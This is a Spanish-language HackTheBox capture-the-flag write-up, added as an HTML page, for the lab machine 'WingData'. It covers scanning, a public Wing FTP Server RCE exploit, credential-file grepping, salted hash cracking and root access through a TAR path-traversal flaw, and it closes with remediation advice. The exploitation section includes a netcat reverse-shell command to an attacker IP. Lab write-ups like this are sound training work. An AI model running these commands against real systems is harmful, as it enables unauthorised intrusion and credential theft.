@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox WingData</title>
+
+  <meta name="description" content="Resolución de la máquina WingData de la plataforma de HackTheBox">
+  <meta name="author" content="s1egfr1ed">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox WingData">
+  <meta name="twitter:description" content="Resolución de la máquina WingData de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="s1egfr1ed">  
+  <meta name="twitter:image" content="/images/hackthebox/wingdata.png" />
+
+  <meta property="og:site_name" content="s1egfr1ed" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox WingData">
+  <meta property="og:description" content="Resolución de la máquina WingData de la plataforma de HackTheBox">
+  <meta property="og:image" content="/images/hackthebox/wingdata.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/hackthebox/wingdata.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox WingData" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="s1egfr1ed">
+          <h1 class="panel-cover__title panel-title scale-up-center">s1egfr1ed</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top"><strong>Pentesting y</strong> <strong>Desarrollo de Malware</strong></p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/hackthebox" title="s1egfr1ed" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/z1egfr1ed" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://linkedin.com/in/marshelaillon" title="Linkedin" target="_blank">
+                  <i class="icon icon-social-linkedin"></i>
+                  <span class="label">Linkedin</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/zygfr1ed" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://x.com/z1egfr1ed" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@s1egfr1ed" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:marshel.aillon@gmail.com" title="Correo Electrónico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#key-findings">Key Findings</a></li>
+        <li><a href="#learning-objectives">Key Learning Objectives</a></li>
+        <li><a href="#reconnaissance">Reconnaissance & Enumeration</a></li>
+        <li><a href="#web-assessment">Web Application Assessment</a></li>
+        <li><a href="#vulnerability">Vulnerability Identification</a></li>
+        <li><a href="#exploitation">Initial Access - RCE Exploitation</a></li>
+        <li><a href="#credential-discovery">Credential Discovery</a></li>
+        <li><a href="#hash-cracking">Hash Cracking</a></li>
+        <li><a href="#ssh-access">SSH Access & User Flag</a></li>
+        <li><a href="#privesc">Privilege Escalation Analysis</a></li>
+        <li><a href="#tar-exploitation">TAR Exploitation - Path Traversal</a></li>
+        <li><a href="#root-access">Root Access Achievement</a></li>
+        <li><a href="#recommendations">Recommendations</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="/images/hackthebox/wingdata.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">WingData</h2><br>
+  </header>
+  
+<section class="post" id="key-findings">
+<br><h3 class="post-title">Key Findings</h3><br>
+
+<p class="plain-text">Durante el análisis de seguridad de la máquina WingData se identificaron las siguientes vulnerabilidades críticas:</p>
+
+<ul class="plain-text">
+  <li>Wing FTP Server v7.4.3 vulnerable a ejecución remota de código (CVE-2025-47812)</li>
+  <li>Credenciales almacenadas en archivos XML de configuración</li>
+  <li>Hashes SHA-256 con salt débil (WingFTP)</li>
+  <li>Privilegios sudo para ejecución de script Python de respaldo</li>
+  <li>Vulnerabilidad de path traversal en archivo TAR (CVE-2025-4138 y CVE-2025-4517)</li>
+  <li>Escalada de privilegios mediante manipulación de archivos TAR maliciosos</li>
+</ul>
+
+</section>
+
+<section class="post" id="learning-objectives">
+<br><h3 class="post-title">Key Learning Objectives</h3><br>
+
+<p class="plain-text">Los objetivos de aprendizaje clave en esta máquina incluyen:</p>
+
+<ul class="plain-text">
+  <li>✅ Port Scanning & Service Enumeration</li>
+  <li>✅ Virtual Host Discovery & Configuration</li>
+  <li>✅ Wing FTP Server Exploitation - CVE-2025-47812</li>
+  <li>✅ XML Configuration File Analysis</li>
+  <li>✅ SHA-256 Hash Cracking with Salt</li>
+  <li>✅ Sudo Privilege Analysis</li>
+  <li>✅ Python TAR Archive Exploitation</li>
+  <li>✅ Path Traversal Attack - CVE-2025-4138/4517</li>
+</ul>
+
+</section>
+
+<section class="post" id="reconnaissance">
+<br><h3 class="post-title">Reconnaissance & Enumeration</h3><br>
+
+<p class="plain-text">El reconocimiento inicial se realizó utilizando Nmap para identificar puertos abiertos y servicios en ejecución.</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo nmap </span><span class="p">-p- --open -n -Pn -vvv -oG ports &lt;IP&gt; --min-rate=2500
+
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-12 13:03 +0100
+Initiating SYN Stealth Scan at 13:03
+Scanning &lt;IP&gt; [65535 ports]
+Discovered open port 22/tcp on &lt;IP&gt;
+Discovered open port 80/tcp on &lt;IP&gt;
+Completed SYN Stealth Scan at 13:04, 52.92s elapsed (65535 total ports)
+</span></code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo nmap </span><span class="p">-p 22,80 -sCV -oN services &lt;IP&gt;
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
+| ssh-hostkey: 
+|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
+|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
+80/tcp open  http    Apache httpd 2.4.66
+|_http-server-header: Apache/2.4.66 (Debian)
+|_http-title: Did not follow redirect to http://wingdata.htb/
+Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></code></pre></div></div><br>
+
+<p class="plain-text"><strong>Resultados:</strong></p>
+<ul class="plain-text">
+  <li>Puerto 22/tcp: OpenSSH 9.2p1 Debian</li>
+  <li>Puerto 80/tcp: Apache httpd 2.4.66</li>
+  <li>Redirección a: http://wingdata.htb/</li>
+</ul>
+
+<p class="plain-text">Antes de examinar la web, agregamos el dominio al archivo hosts:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">'&lt;IP&gt; wingdata.htb'</span><span class="p"> | </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="web-assessment">
+<br><h3 class="post-title">Web Application Assessment</h3><br>
+
+<p class="plain-text">Al acceder a la aplicación web, observamos la página principal de WingData.</p>
+
+<a href="/hackthebox/wingdata/screenshots/wingdata-01.png" target="_blank"><div><p><img src="/hackthebox/wingdata/screenshots/wingdata-01.png"></p></div></a>
+
+<p class="plain-text">Al hacer clic en "Client Portal", nos redirige a <code class="language-plaintext highlighter-rouge">http://ftp.wingdata.htb</code>, pero no carga correctamente. Añadimos el subdominio al archivo hosts:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">'&lt;IP&gt; wingdata.htb ftp.wingdata.htb'</span><span class="p"> | </span><span class="ve">sudo tee</span><span class="p"> /etc/hosts</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora podemos acceder al portal FTP donde observamos un formulario de Wing FTP Server.</p>
+
+<a href="/hackthebox/wingdata/screenshots/wingdata-02.png" target="_blank"><div><p><img src="/hackthebox/wingdata/screenshots/wingdata-02.png"></p></div></a>
+
+<p class="plain-text">Identificamos la versión del servicio:</p>
+
+<ul class="plain-text">
+  <li><strong>Wing FTP Server v7.4.3</strong></li>
+</ul>
+
+</section>
+
+<section class="post" id="vulnerability">
+<br><h3 class="post-title">Vulnerability Identification</h3><br>
+
+<p class="plain-text">Buscamos exploits disponibles para esta versión específica:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ searchsploit </span><span class="p">wing ftp 7.4.3
+
+----------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                             |  Path
+----------------------------------------------------------------------------------------------------------- ---------------------------------
+Wing FTP Server 7.4.3 - Unauthenticated Remote Code Execution  (RCE)                                       | multiple/remote/52347.py
+----------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></code></pre></div></div><br>
+
+<p class="plain-text">Encontramos un exploit para <strong>CVE-2025-47812</strong>. Lo traemos a nuestro directorio local:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ searchsploit </span><span class="p">-m multiple/remote/52347.py
+</span><span class="ve">❯ mv </span><span class="p">52347.py exploit.py</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="exploitation">
+<br><h3 class="post-title">Initial Access - RCE Exploitation</h3><br>
+
+<p class="plain-text">Preparamos un listener en nuestro equipo:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nc </span><span class="p">-lvp 4444</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ejecutamos el exploit para obtener una reverse shell:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py -u http://ftp.wingdata.htb -c </span><span class="am">'nc 10.10.14.5 4444 -e /bin/bash'</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Obtenemos acceso exitoso al sistema:</p>
+
+<a href="/hackthebox/wingdata/screenshots/wingdata-03.png" target="_blank"><div><p><img src="/hackthebox/wingdata/screenshots/wingdata-03.png"></p></div></a>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">wingftp@wingdata:/opt/wftpserver$ </span><span class="am">whoami</span><span class="p">
+wingftp
+</span></code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="credential-discovery">
+<br><h3 class="post-title">Credential Discovery</h3><br>
+
+<p class="plain-text">Exploramos el sistema y los usuarios existentes:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">wingftp@wingdata:/opt/wftpserver$ </span><span class="am">ls </span><span class="p">/home
+wacky
+
+wingftp@wingdata:/opt/wftpserver$ </span><span class="am">pwd</span><span class="p">
+/opt/wftpserver
+</span></code></pre></div></div><br>
+
+<p class="plain-text">Buscamos archivos que contengan credenciales en el directorio actual:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">wingftp@wingdata:/opt/wftpserver$ </span><span class="am">grep </span><span class="p">-ril </span><span class="am">"password"</span><span class="p"> .
+./Data/_ADMINISTRATOR/admins.xml
+./Data/1/users/maria.xml
+./Data/1/users/steve.xml
+./Data/1/users/wacky.xml
+./Data/1/users/anonymous.xml
+./Data/1/users/john.xml
+./Data/1/settings.xml
+./Data/settings.xml
+</span></code></pre></div></div><br>
+
+<p class="plain-text">Examinamos el archivo XML del usuario wacky y encontramos un hash:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">wingftp@wingdata:/opt/wftpserver$ </span><span class="am">cat </span><span class="p">./Data/1/users/wacky.xml | </span><span class="am">grep </span><span class="p">-i password --color=auto
+        &lt;EnablePassword&gt;1&lt;/EnablePassword&gt;
+        &lt;Password&gt;32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca&lt;/Password&gt;
+        &lt;PasswordLength&gt;0&lt;/PasswordLength&gt;
+        &lt;CanChangePassword&gt;0&lt;/CanChangePassword&gt;
+</span></code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="hash-cracking">
+<br><h3 class="post-title">Hash Cracking</h3><br>
+
+<p class="plain-text">Identificamos el tipo de hash usando hashid:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ hashid </span><span class="p">-m 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
+
+Analyzing '32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca'
+[+] Snefru-256 
+[+] SHA-256 [Hashcat Mode: 1400]
+[+] RIPEMD-256 
+[+] Haval-256 
+[+] GOST R 34.11-94 [Hashcat Mode: 6900]
+[+] GOST CryptoPro S-Box 
+[+] SHA3-256 [Hashcat Mode: 5000]
+[+] Skein-256 
+[+] Skein-512(256)
+</span></code></pre></div></div><br>
+
+<p class="plain-text">Intentamos crackear con modo 1400, pero sin éxito:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ hashcat </span><span class="p">-m 1400 hash /usr/share/wordlists/rockyou.txt</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Buscamos modos similares y encontramos el modo #1410 que requiere salt:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ hashcat </span><span class="p">--example | </span><span class="am">grep </span><span class="p">-A 30 -B 30 </span><span class="am">"Hash mode #1400"</span><span class="p">
+
+Hash mode #1410
+  Name................: sha256($pass.$salt)
+  Category............: Raw Hash salted and/or iterated
+  Slow.Hash...........: No
+  Deprecated..........: No
+  Password.Type.......: plain
+  Password.Len.Min....: 0
+  Password.Len.Max....: 256
+  Salt.Type...........: Generic
+</span></code></pre></div></div><br>
+
+<p class="plain-text">Buscamos el salt en los archivos de configuración:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">wingftp@wingdata:/opt/wftpserver$ </span><span class="am">grep </span><span class="p">-ril </span><span class="am">"salt"</span><span class="p"> .
+./Data/1/settings.xml
+
+wingftp@wingdata:/opt/wftpserver$ </span><span class="am">cat </span><span class="p">./Data/1/settings.xml | </span><span class="am">grep </span><span class="p">-i salt --color=auto
+    &lt;EnablePasswordSalting&gt;1&lt;/EnablePasswordSalting&gt;
+    &lt;SaltingString&gt;WingFTP&lt;/SaltingString&gt;
+</span></code></pre></div></div><br>
+
+<p class="plain-text">Formateamos el hash correctamente con el salt:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1"># Formato: hash:salt</span><span class="p">
+32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP
+</span></code></pre></div></div><br>
+
+<p class="plain-text">Crackeamos el hash exitosamente:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ hashcat </span><span class="p">-m 1410 hash /usr/share/wordlists/rockyou.txt
+
+32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:</span><span class="am">!#7Blushing^*Bride5</span>
+</code></pre></div></div><br>
+
+<p class="plain-text"><strong>Contraseña encontrada:</strong> <code class="language-plaintext highlighter-rouge">!#7Blushing^*Bride5</code></p>
+
+</section>
+
+<section class="post" id="ssh-access">
+<br><h3 class="post-title">SSH Access & User Flag</h3><br>
+
+<p class="plain-text">Nos conectamos por SSH con las credenciales obtenidas:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ssh </span><span class="p">wacky@wingdata.htb</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">wacky@wingdata:~$ </span><span class="am">whoami</span><span class="p">
+wacky
+
+wacky@wingdata:~$ </span><span class="am">cat </span><span class="p">/home/wacky/user.txt</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="privesc">
+<br><h3 class="post-title">Privilege Escalation Analysis</h3><br>
+
+<p class="plain-text">Verificamos los privilegios sudo del usuario:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">wacky@wingdata:~$ </span><span class="am">sudo </span><span class="p">-l
+
+Matching Defaults entries for wacky on wingdata:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User wacky may run the following commands on wingdata:
+    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
+</span></code></pre></div></div><br>
+
+<p class="plain-text">El usuario puede ejecutar como root un script Python para restaurar backups. Analizamos el script y descubrimos que está relacionado con vulnerabilidades en el manejo de archivos TAR:</p>
+
+<ul class="plain-text">
+  <li><strong>CVE-2025-4138 (HIGH)</strong> - Permite crear symlinks arbitrarios fuera del directorio de extracción con <code class="language-plaintext highlighter-rouge">filter="data"</code></li>
+  <li><strong>CVE-2025-4517 (CRITICAL)</strong> - Permite escritura arbitraria de archivos fuera del directorio de extracción con <code class="language-plaintext highlighter-rouge">filter="data"</code></li>
+</ul>
+
+</section>
+
+<section class="post" id="tar-exploitation">
+<br><h3 class="post-title">TAR Exploitation - Path Traversal</h3><br>
+
+<p class="plain-text">Creamos un script Python para generar un archivo TAR malicioso que explote la vulnerabilidad de path traversal:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">wacky@wingdata:~$ </span><span class="am">nano </span><span class="p">/tmp/make_evil.py</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ejecutamos el script para crear el archivo TAR malicioso:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">wacky@wingdata:~$ </span><span class="am">python3 </span><span class="p">/tmp/make_evil.py</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ejecutamos el script de restauración con privilegios sudo:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">wacky@wingdata:~$ </span><span class="am">sudo </span><span class="p">/usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_9999.tar -r restore_evil</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="root-access">
+<br><h3 class="post-title">Root Access Achievement</h3><br>
+
+<p class="plain-text">Una vez explotada la vulnerabilidad, obtenemos acceso root:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">wacky@wingdata:~$ </span><span class="am">sudo su</span><span class="p">
+root@wingdata:/home/wacky# </span><span class="am">whoami</span><span class="p">
+root
+</span></code></pre></div></div><br>
+
+<a href="/hackthebox/wingdata/screenshots/wingdata-04.png" target="_blank"><div><p><img src="/hackthebox/wingdata/screenshots/wingdata-04.png"></p></div></a>
+
+<p class="plain-text">Obtenemos la flag de root:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">root@wingdata:~# </span><span class="am">cat </span><span class="p">/root/root.txt</span>
+
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="recommendations">
+<br><h3 class="post-title">Recomendaciones</h3><br>
+
+<br><h4 class="post-title">Acciones Inmediatas</h4><br>
+
+<p class="plain-text"><strong>1. Wing FTP Server Security</strong></p>
+<ul class="plain-text">
+  <li>Actualizar Wing FTP Server a la última versión disponible</li>
+  <li>Aplicar parches de seguridad para CVE-2025-47812</li>
+  <li>Implementar autenticación robusta en todos los servicios FTP</li>
+  <li>Restringir acceso a puertos y servicios no necesarios</li>
+</ul>
+
+<p class="plain-text"><strong>2. Credential Management</strong></p>
+<ul class="plain-text">
+  <li>Eliminar credenciales almacenadas en archivos XML de configuración</li>
+  <li>Implementar vault o sistema de gestión de secretos</li>
+  <li>Usar hashes más robustos con salts únicos por usuario</li>
+  <li>Implementar rotación regular de credenciales</li>
+</ul>
+
+<p class="plain-text"><strong>3. Sudo Privilege Management</strong></p>
+<ul class="plain-text">
+  <li>Eliminar privilegios sudo innecesarios para scripts de backup</li>
+  <li>Implementar validación estricta de entrada en scripts Python</li>
+  <li>Restringir rutas y operaciones permitidas en scripts de backup</li>
+  <li>Auditar regularmente privilegios sudo de usuarios</li>
+</ul>
+
+<p class="plain-text"><strong>4. TAR Archive Handling</strong></p>
+<ul class="plain-text">
+  <li>Actualizar Python y bibliotecas de manejo de archivos TAR</li>
+  <li>Implementar validación de paths antes de extraer archivos</li>
+  <li>Usar filtros seguros para prevenir path traversal</li>
+  <li>Aplicar parches para CVE-2025-4138 y CVE-2025-4517</li>
+</ul>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2026 - s1egfr1ed</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
